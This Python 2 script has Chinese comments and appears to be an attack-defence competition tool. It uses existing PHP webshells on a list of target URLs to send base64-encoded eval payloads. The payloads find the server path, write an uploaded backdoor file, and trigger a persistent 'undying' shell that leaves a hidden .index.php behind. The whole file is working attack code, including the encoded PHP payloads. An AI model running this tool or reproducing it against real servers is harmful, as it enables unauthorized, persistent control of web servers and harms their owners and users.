#!/usr/bin/python
#coding=utf-8

import sys,requests,base64

'''
Usage:
将所需要传shell的url放在webshell.txt中，格式如下：
url(含http:// or https://),method(请求方式),passwd
http://127.0.0.1:80/1110/x.php,post,x
http://127.0.0.2/1110/x.php,post,x
http://127.0.0.3/1110/x.php,post,x

tips: 别在","前后放空格。
'''
#获取靶机的绝对路径
def getpath(url,method,passwd):
	data = {}
	if method == "get":
		data[passwd] = '@eval(base64_decode($_GET[z0]));'
		data['z0'] = 'ZWNobyAkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ107'
		res = requests.get(url,params=data)
		return res.content.strip()
	elif method == "post" :
		data[passwd] = '@eval(base64_decode($_POST[z0]));'
		data['z0'] = 'ZWNobyAkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ107'
		res = requests.post(url,data=data)
		#print data
		return res.content.strip()
	else :
		return 0

#加载要上传的后门内容
def loadfile(filepath):
	try : 
		file = open(filepath,"rb")
		return str(file.read())
	except : 
		print "File %s Not Found!" %filepath
		sys.exit()

#写马函数
def upload(url,method,passwd):
	#http://127.0.0.1:80/1110/x.php,post,x
	'''
	1.http or https
	2.端口要放在ip变量中
	3.Rfile  /1110/x.php
	'''
	try:
		url.index("http")
		#去除http://   ==> 127.0.0.1:80/1110/x.php
		urlstr=url[7:]
		lis = urlstr.split("/")
		ip=str(lis[0])
		Rfile = ""
		for i in range(1,len(lis)):
			Rfile = Rfile+"/"+str(lis[i])
	except :
		urlstr=url[8:]
		lis = urlstr.split("/")
		ip=str(lis[0])
		Rfile = ""
		for i in range(1,len(lis)):
			Rfile = Rfile+"/"+str(lis[i])
	#判断shell是否存在
	try :
		res = requests.get(url,timeout=10)
	except : 
		print "[-] %s ERR_CONNECTION_TIMED_OUT" %url
		return 0
	if res.status_code!=200 :
		print "[-] %s Page Not Found!" %url
		return 0

	#加载要写入的内容
	shellPath = "./shell.php"
	shell_content = loadfile(shellPath)

	#获取靶机的绝对路径
	Rpath = getpath(url,method,passwd)#D:/phpStudy/WWW/1110/x.php
	list0 = Rpath.split("/")
	Rpath = ""
	for i in range(0,(len(list0)-1)):
		Rpath = Rpath+list0[i]+"/"
	data = {}
	#判断method
	if method =="post" :
		data[passwd] = "@eval(base64_decode($_POST['z0']));"
		data['z0'] = 'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzsKJGY9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pOwokYz1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejIiXSk7CiRjPXN0cl9yZXBsYWNlKCJcciIsIiIsJGMpOwokYz1zdHJfcmVwbGFjZSgiXG4iLCIiLCRjKTsKJGJ1Zj0iIjsKZm9yKCRpPTA7JGk8c3RybGVuKCRjKTskaSs9MSkKICAgICRidWYuPXN1YnN0cigkYywkaSwxKTsKZWNobyhAZndyaXRlKGZvcGVuKCRmLCJ3IiksJGJ1ZikpOwplY2hvKCJ8PC0iKTsKZGllKCk7'
		data['z1'] = base64.b64encode(Rpath+"/fuck.php")
		data["z2"] = base64.b64encode(shell_content)
		#print data
		res = requests.post(url,data=data)
	elif method=="get" :
		data[passwd] = "@eval(base64_decode($_GET['z0']));"
		data['z0'] = 'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzsKJGY9YmFzZTY0X2RlY29kZSgkX0dFVFsiejEiXSk7CiRjPWJhc2U2NF9kZWNvZGUoJF9HRVRbInoyIl0pOwokYz1zdHJfcmVwbGFjZSgiXHIiLCIiLCRjKTsKJGM9c3RyX3JlcGxhY2UoIlxuIiwiIiwkYyk7CiRidWY9IiI7CmZvcigkaT0wOyRpPHN0cmxlbigkYyk7JGkrPTEpCiAgICAkYnVmLj1zdWJzdHIoJGMsJGksMSk7CmVjaG8oQGZ3cml0ZShmb3BlbigkZiwidyIpLCRidWYpKTsKZWNobygifDwtIik7CmRpZSgpOw=='
		data['z1'] = base64.b64encode(Rpath+"/fuck.php")
		data["z2"] = base64.b64encode(shell_content)
		res = requests.post(url,params=data)
	else :
		print "method err!"
		sys.exit()

	#判断是否上传成功,失败直接跳过
	#print res.content
	if res.status_code!=200:
		print "[-] %s upload failed!" %ip
		return 0

	#激活不死马
	list=Rfile.split("/")
	b_url="http://"+ip
	max = len(list)-1
	for i in range(1,max):
		b_url=b_url+"/"+list[i]
	bsm_url = b_url+"/fuck.php"
	try : 
		res = requests.get(bsm_url,timeout=3)
	except :
		pass
	#尝试访问不死马生成的shell
	shell_url = b_url+"/.index.php"
	res = requests.get(shell_url)
	if res.status_code!=200 :
		print "[-] %s create shell failed!" %bsm_url
		return 0
	#输出shell地址
	print "[+] %s upload sucessed!" %shell_url


if __name__ == '__main__':
	shellstr=loadfile("./webshell.txt")
	list = shellstr.split("\r\n")
	#print str(list)
	i = 0
	url={}
	passwd={}
	method={}
	for data in list:
		if data:
			ls = data.split(",")
			method_tmp = str(ls[1])
			method_tmp = method_tmp.lower()
			if method_tmp=='post' or method_tmp=='get':
				url[i]=str(ls[0])
				method[i]=method_tmp
				passwd[i]=str(ls[2])
				i+=1
			else :
				print "[-] %s request method error!" %(str(ls[0]))
		else : pass
	for j in range(len(url)):
		#print "url is %s method is %s passwd is %s" %(url[j],method[j],passwd[j])
		upload(url=url[j],method=method[j],passwd=passwd[j])
